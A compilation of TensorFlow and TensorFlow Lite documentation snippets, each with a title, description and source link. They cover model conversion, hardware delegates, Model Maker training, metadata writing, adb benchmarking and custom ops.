DESCRIPTION: Initializes a `BertClassifierSpec` object to define the configuration for a BERT model used in text classification with TFLite Model Maker. This constructor takes various parameters to control aspects like the BERT module URI, sequence length, dropout rate, learning rate, and training setup (GPUs, TPUs).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.text_classifier.BertClassifierSpec(
    uri='https://tfhub.dev/tensorflow/bert_en_uncased_L-12_H-768_A-12/1',
    model_dir=None,
    seq_len=128,
    dropout_rate=0.1,
    initializer_range=0.02,
    learning_rate=3e-05,
    distribution_strategy='mirrored',
    num_gpus=-1,
    tpu='',
    trainable=True,
    do_lower_case=True,
    is_tf2=True,
    name='Bert',
    tflite_input_name=None,
    default_batch_size=32,
    index_to_label=None
)
```

----------------------------------------

TITLE: Getting Associated File Buffer from TFLite Metadata in Python
DESCRIPTION: Defines the method signature for `get_associated_file_buffer`. This method extracts the content of a specified associated file from the model buffer, returning it as a bytearray. It raises a `ValueError` if the requested file is not found.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_1

LANGUAGE: python
CODE:
```
get_associated_file_buffer(
    filename
)
```

----------------------------------------

TITLE: Convert SavedModel to TFLite Python
DESCRIPTION: This snippet converts the TensorFlow SavedModel (exported with `orbax-export`, including pre/post-processing) into a TensorFlow Lite model. It initializes a `TFLiteConverter` from the SavedModel directory and then calls the `convert()` method to generate the `.tflite` model content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Evaluating TFLite Model on All Images Python
DESCRIPTION: This helper function evaluates the accuracy of a TFLite model by running inference on all images in the test dataset. It uses `run_tflite_model` to get predictions for all images, calculates the percentage of correct predictions, and prints the result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_13

LANGUAGE: Python
CODE:
```
# Helper function to evaluate a TFLite model on all images
def evaluate_model(tflite_file, model_type):
  global test_images
  global test_labels

  test_image_indices = range(test_images.shape[0])
  predictions = run_tflite_model(tflite_file, test_image_indices)

  accuracy = (np.sum(test_labels== predictions) * 100) / len(test_images)

  print('%s model accuracy is %.4f%% (Number of test samples=%d)' % (
      model_type, accuracy, len(test_images)))
```

----------------------------------------

TITLE: Initializing Image Classifier MetadataWriter Python
DESCRIPTION: Initializes the `MetadataWriter` class for embedding metadata into a TFLite image classifier model. It requires the model buffer and optionally accepts a metadata buffer and a list of associated file paths. This sets up the writer instance to manage the metadata population process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_classifier/MetadataWriter.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.image_classifier.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Configuring CMake for ARMv7 TFLite (sh)
DESCRIPTION: This script block sets environment variables for the ARMv7 cross-compiler prefix and specific compilation flags optimized for ARMv7 with NEON (e.g., -march=armv7-a -mfpu=neon-vfpv4), then invokes CMake to configure the TensorFlow Lite build system for ARMv7.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_5

LANGUAGE: sh
CODE:
```
ARMCC_FLAGS="-march=armv7-a -mfpu=neon-vfpv4 -funsafe-math-optimizations -mfp16-format=ieee"
ARMCC_PREFIX=${HOME}/toolchains/gcc-arm-8.3-2019.03-x86_64-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-
cmake -DCMAKE_C_COMPILER=${ARMCC_PREFIX}gcc \
  -DCMAKE_CXX_COMPILER=${ARMCC_PREFIX}g++ \
  -DCMAKE_C_FLAGS="${ARMCC_FLAGS}" \
  -DCMAKE_CXX_FLAGS="${ARMCC_FLAGS}" \
  -DCMAKE_VERBOSE_MAKEFILE:BOOL=ON \
  -DCMAKE_SYSTEM_NAME=Linux \
  -DCMAKE_SYSTEM_PROCESSOR=armv7 \
  ../tensorflow/lite/
```

----------------------------------------

TITLE: Fallback to Metal Delegate (C)
DESCRIPTION: Illustrates the C API method for creating a TfLiteCoreMlDelegate and checking if it was successful. If it returns NULL, it falls back to creating a TFLGpuDelegate (Metal/GPU delegate) as an alternative hardware accelerator.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_9

LANGUAGE: C
CODE:
```
TfLiteCoreMlDelegateOptions options = {};
    delegate = TfLiteCoreMlDelegateCreate(&amp;options);
    if (delegate == NULL) {
      // Add Metal delegate options if necessary
      delegate = TFLGpuDelegateCreate(NULL);
    }
    // Initialize interpreter with delegate
```

----------------------------------------

TITLE: Disable Quantized Model Support for GPU Delegate (Java)
DESCRIPTION: Demonstrates how to create a `GpuDelegate` instance with the `setQuantizedModelsAllowed(false)` option set, effectively disabling support for quantized models when using this specific delegate instance. Shows how to then add this configured delegate to the `Interpreter.Options` before creating the Interpreter. Requires the TFLite GPU delegate dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_8

LANGUAGE: Java
CODE:
```
GpuDelegate delegate = new GpuDelegate(new GpuDelegate.Options().setQuantizedModelsAllowed(false));

Interpreter.Options options = (new Interpreter.Options()).addDelegate(delegate);
```

----------------------------------------

TITLE: Creating and Training Model with Custom Epochs - TensorFlow Lite Model Maker - Python
DESCRIPTION: Creates and trains a new model using the `text_classifier.create` function, overriding the default number of training epochs specified in the model specification. This allows tuning the training process, potentially affecting accuracy and overfitting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_26

LANGUAGE: python
CODE:
```
model = text_classifier.create(new_train_data, model_spec=new_model_spec, epochs=20)
```

----------------------------------------

TITLE: Saving Initial Checkpoint Python
DESCRIPTION: Saves the pre-trained model weights to a checkpoint file using the model's save method. This is typically done before converting the model to TensorFlow Lite to provide an initial state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
m.save('/tmp/model.ckpt')
```

----------------------------------------

TITLE: Evaluating TensorFlow Object Detector Model Python
DESCRIPTION: Evaluates the performance of the trained TensorFlow model using the separate test dataset via the `model.evaluate` method. The evaluation metrics are based on the COCO detection evaluation standard.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
model.evaluate(test_data)
```

----------------------------------------

TITLE: Comparing Original and TFLite Inference Output Python
DESCRIPTION: Compares the inference results (logits) obtained from the original TensorFlow model and the converted TensorFlow Lite model using the same input sample. This step verifies that the conversion process did not significantly alter the model's output behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
logits_original = m.infer(x=train_images[:1])['logits'][0]
logits_lite = infer(x=train_images[:1])['logits'][0]
```

----------------------------------------

TITLE: Creating MetadataWriter from Metadata Info Objects (Python)
DESCRIPTION: This class method creates a MetadataWriter object by taking general, input image tensor, and output segmentation mask tensor information objects along with the model buffer. It allows creating metadata using higher-level info structures, returning a MetadataWriter instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/GeneralMd"><code>tflite_support.metadata_writers.metadata_info.GeneralMd</code></a>] = None,
    input_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/InputImageTensorMd"><code>tflite_support.metadata_writers.metadata_info.InputImageTensorMd</code></a>] = None,
    output_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/TensorMd"><code>tflite_support.metadata_writers.metadata_info.TensorMd</code></a>] = None
)
```

----------------------------------------

TITLE: Creating DataLoader Instance Python
DESCRIPTION: Creates a DataLoader instance using a class method, specifying the path to the image embedder model. It handles the instantiation of the embedder internally and allows configuration of metadata loading and L2 normalization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ImageDataLoader.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create(
    image_embedder_path: str,
    metadata_type: tflite_model_maker.searcher.MetadataType = tflite_model_maker.searcher.MetadataType.FROM_FILE_NAME,
    l2_normalize: bool = False
) -> 'DataLoader'
```

----------------------------------------

TITLE: Configuring TFLiteConverter for FP16 Support (Python)
DESCRIPTION: This snippet shows how to configure the TensorFlow Lite Converter (`tf.lite.TFLiteConverter`) to indicate support for FP16 inference. It sets default optimizations, specifies `tf.float16` as a supported type, and uses an experimental attribute `_experimental_supported_accumulation_type` to signal FP16 compatibility, allowing XNNPACK to potentially utilize native FP16 hardware.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_8

LANGUAGE: python
CODE:
```
converter.optimizations = [tf.lite.Optimize.DEFAULT]
...
converter.target_spec.supported_types = [tf.float16]
converter.target_spec._experimental_supported_accumulation_type = tf.dtypes.float16
```

----------------------------------------

TITLE: Providing Input Value to TFLite Micro Tensor (C++)
DESCRIPTION: Sets the value of the input tensor. For a single-element float tensor, the value is written directly to the `input->data.f[0]` location. This populates the tensor with the specific input data point for the model to process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_13

LANGUAGE: C++
CODE:
```
input->data.f[0] = 0.;
```

----------------------------------------

TITLE: Creating BertNLClassifier from File in Python
DESCRIPTION: A class method to create a `BertNLClassifier` instance by loading a TensorFlow Lite model from the specified `file_path`. It returns a new `BertNLClassifier` object or raises `ValueError` or `RuntimeError` if loading fails. Requires the path to the model file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertNLClassifier.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'BertNLClassifier'
```

----------------------------------------

TITLE: Creating TFLite AudioEmbedder From Options Python
DESCRIPTION: A class method to create an `AudioEmbedder` instance using a pre-configured `AudioEmbedderOptions` object. This provides more control over the embedder's behavior compared to `create_from_file`. Raises `ValueError` or `RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.audio.AudioEmbedderOptions
) -> 'AudioEmbedder'
```

----------------------------------------

TITLE: Creating Output Tensor Metadata (Python)
DESCRIPTION: This Python snippet demonstrates how to create metadata for an output tensor in a TFLite model using the `_metadata_fb` flatbuffers objects. It defines properties like name, description, content type, statistics (min/max), and associated files (like a label file). It requires the `tensorflow_lite_support.metadata.python` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_5

LANGUAGE: python
CODE:
```
output_meta = _metadata_fb.TensorMetadataT()
output_meta.name = "probability"
output_meta.description = "Probabilities of the 1001 labels respectively."
output_meta.content = _metadata_fb.ContentT()
output_meta.content.content_properties = _metadata_fb.FeaturePropertiesT()
output_meta.content.contentPropertiesType = (
    _metadata_fb.ContentProperties.FeatureProperties)
output_stats = _metadata_fb.StatsT()
output_stats.max = [1.0]
output_stats.min = [0.0]
output_meta.stats = output_stats
label_file = _metadata_fb.AssociatedFileT()
label_file.name = os.path.basename("your_path_to_label_file")
label_file.description = "Labels for objects that the model can recognize."
label_file.type = _metadata_fb.AssociatedFileType.TENSOR_AXIS_LABELS
output_meta.associatedFiles = [label_file]
```

----------------------------------------

TITLE: Initialize TFLite Interpreter with CoreML Delegate (Objective-C)
DESCRIPTION: Initializes the TensorFlow Lite Interpreter in Objective-C with the TFLCoreMLDelegate. This includes importing necessary headers, creating delegate options, instantiating the delegate and interpreter, and performing tensor allocation with error handling.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_2

LANGUAGE: Objective-C
CODE:
```
// Import module when using CocoaPods with module support
    @import TFLTensorFlowLite;

    // Or import following headers manually
    # import "tensorflow/lite/objc/apis/TFLCoreMLDelegate.h"
    # import "tensorflow/lite/lite/objc/apis/TFLTensorFlowLite.h"

    // Initialize Core ML delegate
    TFLCoreMLDelegate* coreMLDelegate = [[TFLCoreMLDelegate alloc] init];

    // Initialize interpreter with model path and Core ML delegate
    TFLInterpreterOptions* options = [[TFLInterpreterOptions alloc] init];
    NSError* error = nil;
    TFLInterpreter* interpreter = [[TFLInterpreter alloc]
                                    initWithModelPath:modelPath
                                              options:options
                                            delegates:@[ coreMLDelegate ]
                                                error:&amp;error];
    if (error != nil) { /* Error handling... */ }

    if (![interpreter allocateTensorsWithError:&amp;error]) { /* Error handling... */ }
    if (error != nil) { /* Error handling... */ }

    // Run inference ...
```

----------------------------------------

TITLE: Initializing and Running Image Segmenter in Objective-C (iOS)
DESCRIPTION: This Objective-C snippet shows how to import the required header, obtain the model path, create `TFLImageSegmenterOptions`, initialize a `TFLImageSegmenter` instance, convert a `UIImage` to a `GMLImage`, and perform the segmentation inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_4

LANGUAGE: Objective-C
CODE:
```
// Imports
#import <TensorFlowLiteTaskVision/TensorFlowLiteTaskVision.h>

// Initialization
NSString *modelPath = [[NSBundle mainBundle] pathForResource:@"deeplabv3" ofType:@"tflite"];

TFLImageSegmenterOptions *options =
    [[TFLImageSegmenterOptions alloc] initWithModelPath:modelPath];

// Configure any additional options:
// options.outputType = TFLOutputTypeConfidenceMasks;

TFLImageSegmenter *segmenter = [TFLImageSegmenter imageSegmenterWithOptions:options
                                                                      error:nil];

// Convert the input image to MLImage.
UIImage *image = [UIImage imageNamed:@"plane.jpg"];

// There are other sources for GMLImage. For more details, please see:
// https://developers.google.com/ml-kit/reference/ios/mlimage/api/reference/Classes/GMLImage
GMLImage *gmlImage = [[GMLImage alloc] initWithImage:image];

// Run inference
TFLSegmentationResult *segmentationResult =
    [segmenter segmentWithGMLImage:gmlImage error:nil];
```

----------------------------------------

TITLE: Using TensorFlow Custom Op Python
DESCRIPTION: Demonstrates importing and using the built `multiplex_4_op.multiplex` custom operation in a Python script. It shows initializing input tensors (including lists of tensors) and calling the custom op function, providing a basic example of how to integrate the custom op into a TensorFlow program after successful compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_11

LANGUAGE: Python
CODE:
```
import tensorflow as tf

from tensorflow.examples.custom_ops_doc.multiplex_4 import multiplex_4_op

a1 = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
a2 = tf.constant([6, 7, 8, 9, 10], dtype=tf.int64)
a3 = tf.constant([11, 12, 13, 14, 15], dtype=tf.int64)
a = [a1, a2, a3]
b = tf.constant([101, 102, 103, 104, 105], dtype=tf.int64)
cond1 = tf.constant([False, False, True, False, False], dtype=bool)
cond2 = tf.constant([False, False, False, False, True], dtype=bool)
cond3 = tf.constant([True, False, True, False, True], dtype=bool)
cond = [cond1, cond2, cond3]
# expected result is [11, 102, 3, 104, 10]
result = multiplex_4_op.multiplex(cond, a, b)
```

----------------------------------------

TITLE: Setting Up TFLite Micro Error Reporter (C++)
DESCRIPTION: Instantiates a `tflite::MicroErrorReporter` and creates a generic `tflite::ErrorReporter` pointer. This object handles logging and error reporting within the TFLite Micro framework, allowing for platform-specific customization of debug output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_4

LANGUAGE: C++
CODE:
```
tflite::MicroErrorReporter micro_error_reporter;
tflite::ErrorReporter* error_reporter = &micro_error_reporter;
```

----------------------------------------

TITLE: Run TFLite Image Classification Evaluation via ADB Shell
DESCRIPTION: This command executes the TensorFlow Lite image classification evaluation tool binary, which has been pushed to an Android device via ADB. It configures the evaluation using command-line flags, specifying the model file path, paths to ground truth images and labels, output file paths, the number of images to evaluate, and enables NNAPI acceleration using a specific accelerator (Google Edge-TPU). Prerequisites include an ADB-connected device with the evaluation binary, model, and data files transferred to the specified paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/delegates.md#_snippet_1

LANGUAGE: Shell
CODE:
```
adb shell /data/local/tmp/run_eval \
  --model_file=/data/local/tmp/mobilenet_quant_v1_224.tflite \
  --ground_truth_images_path=/data/local/tmp/ilsvrc_images \
  --ground_truth_labels=/data/local/tmp/ilsvrc_validation_labels.txt \
  --model_output_labels=/data/local/tmp/model_output_labels.txt \
  --output_file_path=/data/local/tmp/accuracy_output.txt \
  --num_images=0 # Run on all images. \
  --use_nnapi=true \
  --nnapi_accelerator_name=google-edgetpu
```

----------------------------------------

TITLE: Processing Audio Data using TensorAudio Java
DESCRIPTION: This Java snippet illustrates how to use the `TensorAudio` class from the Support Library to handle audio data captured by Android's `AudioRecord`. It shows how to create a `TensorAudio` object from the `AudioRecord` format, load available audio samples into its internal buffer, and then obtain a `TensorBuffer` containing the processed audio data ready for TFLite inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_2

LANGUAGE: Java
CODE:
```
import android.media.AudioRecord;
import org.tensorflow.lite.support.audio.TensorAudio;

// Create an `AudioRecord` instance.
AudioRecord record = AudioRecord(...)

// Create a `TensorAudio` object from Android AudioFormat.
TensorAudio tensorAudio = new TensorAudio(record.getFormat(), size)

// Load all audio samples available in the AudioRecord without blocking.
tensorAudio.load(record)

// Get the `TensorBuffer` for inference.
TensorBuffer buffer = tensorAudio.getTensorBuffer()
```

----------------------------------------

TITLE: Customize EfficientDet Hyperparameters - Python (Model Maker)
DESCRIPTION: This snippet shows how to get a model specification (here, `efficientdet_lite0`) and customize its configuration. Specifically, it sets the `var_freeze_expr` parameter to 'efficientnet' to freeze variables within the EfficientNet backbone during training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
spec = model_spec.get('efficientdet_lite0')
spec.config.var_freeze_expr = 'efficientnet'
```

----------------------------------------

TITLE: Display Confusion Matrix for Model Evaluation in Python
DESCRIPTION: This code defines a utility function to visualize a normalized confusion matrix using Seaborn and Matplotlib. It then calculates the confusion matrix for the trained model on the test data and calls the display function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
def show_confusion_matrix(confusion, test_labels):
  """Compute confusion matrix and normalize."""
  confusion_normalized = confusion.astype("float") / confusion.sum(axis=1)
  sns.set(rc = {'figure.figsize':(6,6)})
  sns.heatmap(
      confusion_normalized, xticklabels=test_labels, yticklabels=test_labels,
      cmap='Blues', annot=True, fmt='.2f', square=True, cbar=False)
  plt.title("Confusion matrix")
  plt.ylabel("True label")
  plt.xlabel("Predicted label")

confusion_matrix = model.confusion_matrix(test_data)
show_confusion_matrix(confusion_matrix.numpy(), test_data.index_to_label)
```

----------------------------------------

TITLE: Plotting Confusion Matrix and Report - Python
DESCRIPTION: Defines a function to plot a confusion matrix, optionally normalized. It then uses the trained model to predict classes on the test data, generates the confusion matrix and classification report comparing true vs. predicted labels, and displays these visualizations and reports for a detailed performance analysis per class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
def plot_confusion_matrix(cm, classes,
                          normalize=False,
                          title='Confusion matrix',
                          cmap=plt.cm.Blues):
  """Plots the confusion matrix."""
  if normalize:
    cm = cm.astype('float') / cm.sum(axis=1)[:, np.newaxis]
    print("Normalized confusion matrix")
  else:
    print('Confusion matrix, without normalization')

  plt.imshow(cm, interpolation='nearest', cmap=cmap)
  plt.title(title)
  plt.colorbar()
  tick_marks = np.arange(len(classes))
  plt.xticks(tick_marks, classes, rotation=55)
  plt.yticks(tick_marks, classes)
  fmt = '.2f' if normalize else 'd'
  thresh = cm.max() / 2.
  for i, j in itertools.product(range(cm.shape[0]), range(cm.shape[1])):
    plt.text(j, i, format(cm[i, j], fmt),
              horizontalalignment="center",
              color="white" if cm[i, j] > thresh else "black")

  plt.ylabel('True label')
  plt.xlabel('Predicted label')
  plt.tight_layout()

# Classify pose in the TEST dataset using the trained model
y_pred = model.predict(X_test)

# Convert the prediction result to class name
y_pred_label = [class_names[i] for i in np.argmax(y_pred, axis=1)]
y_true_label = [class_names[i] for i in np.argmax(y_test, axis=1)]

# Plot the confusion matrix
cm = confusion_matrix(np.argmax(y_test, axis=1), np.argmax(y_pred, axis=1))
plot_confusion_matrix(cm,
                      class_names,
                      title ='Confusion Matrix of Pose Classification Model')

# Print the classification report
print('\nClassification Report:\n', classification_report(y_true_label,
                                                          y_pred_label))
```

----------------------------------------

TITLE: Initialize and Search with TFLite TextSearcher (Python)
DESCRIPTION: Illustrates the Python API usage for initializing the `TextSearcher` directly from a model file path and performing a search query against an input text string. Requires the `tflite-support` package to be installed and a pre-built TFLite searcher model file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_searcher.md#_snippet_4

LANGUAGE: Python
CODE:
```
from tflite_support.task import text

# Initialization
text_searcher = text.TextSearcher.create_from_file(model_path)

# Run inference
result = text_searcher.search(text)
```

----------------------------------------

TITLE: Benchmarking TFLite Model with GPU Delegate (Shell/ADB)
DESCRIPTION: This command executes the TensorFlow Lite benchmark tool on an Android device via `adb shell`. It specifies the path to a quantized MobileNet V1 TFLite model and enables the GPU delegate for acceleration. This command is used to measure the model's performance (latency, memory footprint, etc.) when running accelerated on the device's GPU.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/delegates.md#_snippet_0

LANGUAGE: Shell
CODE:
```
adb shell /data/local/tmp/benchmark_model \
  --graph=/data/local/tmp/mobilenet_v1_224_quant.tflite \
  --use_gpu=true
```

----------------------------------------

TITLE: Initialize TFLite Interpreter with CoreML Delegate (Swift)
DESCRIPTION: Initializes the TensorFlow Lite Interpreter in Swift using the CoreMLDelegate if it is successfully created (typically on devices with a Neural Engine). If the delegate cannot be created, it falls back to using the standard CPU interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_1

LANGUAGE: Swift
CODE:
```
let coreMLDelegate = CoreMLDelegate()
    var interpreter: Interpreter

    // Core ML delegate will only be created for devices with Neural Engine
    if coreMLDelegate != nil {
      interpreter = try Interpreter(modelPath: modelPath,
                                    delegates: [coreMLDelegate!])
    } else {
      interpreter = try Interpreter(modelPath: modelPath)
    }
```

----------------------------------------

TITLE: Await Initialization Task (Blocking) - Java
DESCRIPTION: This Java snippet demonstrates using `Tasks.await()` to synchronously wait for the `initializeTask` to complete. This method should only be called on a background thread, as blocking the UI thread will cause ANRs (Application Not Responding).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_10

LANGUAGE: Java
CODE:
```
@BackgroundThread
InterpreterApi initializeInterpreter() {
    Tasks.await(initializeTask);
    return InterpreterApi.create(...);
}
```

----------------------------------------

TITLE: Including TFLite C API Headers (C++)
DESCRIPTION: Includes the necessary header files from the TensorFlow Lite C API, specifically `c_api.h` for general API functions and `c_api_opaque.h` for definitions related to opaque types like `TfLiteOperator` and `TfLiteOpaqueContext`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_4

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/c/c_api.h"
#include "tensorflow/lite/c/c_api_opaque.h"
```

----------------------------------------

TITLE: Initialize TFLite Google Play Services with GPU (Kotlin)
DESCRIPTION: Asynchronously checks if a GPU delegate is available on the device using `TfLiteGpu.isGpuDelegateAvailable`. Based on the availability check result, it then asynchronously initializes TensorFlow Lite via Google Play Services, configuring it to enable GPU delegate support if available. Requires an Android `Context` and the TFLite Play Services GPU dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_1

LANGUAGE: Kotlin
CODE:
```
val useGpuTask = TfLiteGpu.isGpuDelegateAvailable(context)

    val interpreterTask = useGpuTask.continueWith { useGpuTask ->
      TfLite.initialize(context,
          TfLiteInitializationOptions.builder()
          .setEnableGpuDelegateSupport(useGpuTask.result)
          .build())
      }
```

----------------------------------------

TITLE: Attempting Incompatible TFLite Conversion Python
DESCRIPTION: Demonstrates the standard process of converting a `tf.function` to TensorFlow Lite using `tf.lite.TFLiteConverter`. It attempts to convert the `f` function defined earlier, which is expected to fail because `tf.cosh` is unsupported. The code includes a try-except block to catch and print the conversion error, illustrating the problem the authoring tool aims to solve.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
# Convert the tf.function
converter = tf.lite.TFLiteConverter.from_concrete_functions(
 [f.get_concrete_function()], f)
try:
 fb_model = converter.convert()
except Exception as e:
 print(f"Got an exception: {e}")
```

----------------------------------------

TITLE: Visualizing Training Accuracy - Python
DESCRIPTION: Plots the training and validation accuracy metrics recorded during the model training process. This visualization helps in monitoring the model's learning progress and identifying whether the model is overfitting by observing the divergence between training and validation accuracy curves over epochs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_18

LANGUAGE: python
CODE:
```
# Visualize the training history to see whether you're overfitting.
plt.plot(history.history['accuracy'])
plt.plot(history.history['val_accuracy'])
plt.title('Model accuracy')
plt.ylabel('accuracy')
plt.xlabel('epoch')
plt.legend(['TRAIN', 'VAL'], loc='lower right')
plt.show()
```

----------------------------------------

TITLE: Implementing ComputeAsync Method (C++)
DESCRIPTION: Provides the implementation for the `ComputeAsync` method of the `AsyncOpKernel`. It validates the scalar float input `delay`, checks for non-negativity, acquires a thread pool, allocates the output tensor, calculates the wake-up time using Abseil Time, and schedules the `sleeper` helper method on the thread pool to perform the sleep asynchronously. It uses `OP_REQUIRES_ASYNC` and `OP_REQUIRES_OK_ASYNC` for error handling, ensuring the `done` callback is called on error paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_6

LANGUAGE: C++
CODE:
```
  void ComputeAsync(OpKernelContext* ctx, DoneCallback done) override {
    const auto& delay_tensor = ctx->input(0);
    OP_REQUIRES_ASYNC(
        ctx, ::tensorflow::TensorShapeUtils::IsScalar(delay_tensor.shape()),
        InvalidArgument("Input `delay` must be a scalar."),
        done);  // Important: call `done` in every execution path
    const float delay = delay_tensor.flat<float>()(0);
    OP_REQUIRES_ASYNC(ctx, delay >= 0.0,
                      InvalidArgument("Input `delay` must be non-negative."),
                      done);  // Important: call `done` in every execution path
    auto thread_pool = ctx->device()->tensorflow_cpu_worker_threads()->workers;
    OP_REQUIRES_ASYNC(ctx, thread_pool != nullptr,
                      Internal("No thread_pool found."),
                      done);  // Important: call `done` in every execution path

    Tensor* output_tensor = nullptr;
    OP_REQUIRES_OK_ASYNC(
        ctx, ctx->allocate_output(0, delay_tensor.shape(), &output_tensor),
        done);  // Important: call `done` in every execution path

    absl::Time now = absl::Now();
    absl::Time when = now + absl::Seconds(delay);
    VLOG(1) << "BEFORE ASYNC SLEEP " << ctx->op_kernel().name() << " now "
            << now << " when " << when;
    thread_pool->Schedule([this, output_tensor, when, done] {
      this->sleeper(output_tensor, when, done);
    });
    // Note that `done` is normally called by sleeper(), it is not normally
    // called by this function.
  }
```

----------------------------------------

TITLE: Run TensorFlow tfprof Advise using CLI
DESCRIPTION: Illustrates how to use the tfprof command-line interface (CLI) to analyze pre-generated profile files and run the 'advise' command. This requires specifying paths to the graph definition, run metadata, and op log files. The output shows examples of the advice provided by different checkers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/advise.md#_snippet_1

LANGUAGE: Shell
CODE:
```
# Run advisor on CLI
# See CLI tutorial on generating the files.
tfprof --graph_path=graph.pbtxt \
       --run_meta_path=run_metadata \
       --op_log_path=tfprof_log

tfprof> advise
AcceleratorUtilizationChecker:
device: /job:worker/replica:0/task:0/device:GPU:0 low utilization: 0.03
device: /job:worker/replica:0/task:0/device:GPU:1 low utilization: 0.08
device: /job:worker/replica:0/task:0/device:GPU:2 low utilization: 0.04
